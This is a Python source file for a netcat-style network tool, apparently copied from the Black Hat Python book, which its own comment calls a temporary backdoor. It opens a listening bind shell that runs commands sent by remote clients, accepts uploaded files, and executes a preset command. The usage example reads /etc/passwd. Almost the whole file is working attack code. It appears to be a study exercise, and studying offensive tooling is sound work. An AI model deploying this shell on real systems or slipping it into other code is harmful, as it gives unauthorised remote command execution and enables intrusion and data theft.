import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

# Brief:
#########################################
# Fun little nc-like tool that can keep
# you in but is nothing more than a tmp
# backdoor. All -c calls are instant 
# sub-proc so no cd, no new shell, 
# no keep-alive privesc.
# Also, can only send UTF-8 files because
# of the sys.stdin.read()
# 


def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    return output


class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # See sys/socket.h (set options reuseaddress on socket level to 1 or true)
        # which ignores the timeout in between socket usage
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)


    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    
    def send(self):
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            # The buffer will most likely be a command or a file but will need to be escaped if empty (^D = EOF)
            self.socket.send(self.buffer)

        try:
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                    
                if response:
                    print(response)
                    buffer = input('L---> ')
                    buffer += '\n'
                    self.socket.send(buffer.encode())

        except KeyboardInterrupt:
            print('Connnection closed')
            self.socket.close()
            sys.exit()

    
    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)

        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(
                target=self.handle_client, args=(client_socket,)
            )
            client_thread.start()

    
    def handle_client(self, client_socket):
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())
        
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break

            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())

        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'<BHP #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    print(cmd_buffer.decode())
                    response = execute(cmd_buffer.decode('UTF-8'))
                    if response:
                        client_socket.send(response)
                    cmd_buffer = b''
                except Exception as e:
                    print(f'Server killed: {e}')
                    self.socket.close()
                    sys.exit()         


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='This is a python netcat-like tool (from BHP)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Example:
        nc.py -t 192.168.0.13 -p 4444 -l -c # command shell
        nc.py -t 192.168.0.13 -p 4444 -l -u=test.txt # upload file
        nc.py -t 192.168.0.13 -p 4444 -l -e=\"cat /etc/passwd\" # execute command
        echo 'ABC' | ./nc.py -t 192.168.0.13 -p 4444 -l -c # echo text to server
        nc.py -t 192.168.0.13 -p 4444 # commect to server
        ''')
    )

    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen mode')
    parser.add_argument('-p', '--port', type=int, default=4444, help='specify port')
    parser.add_argument('-t', '--target', default='0.0.0.0', help='specify ip')
    parser.add_argument('-u', '--upload', help='upload file')

    args = parser.parse_args()
    
    # args is a dictionnary, listen stores either True or False
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()

    nc = NetCat(args, buffer.encode())
    nc.run()
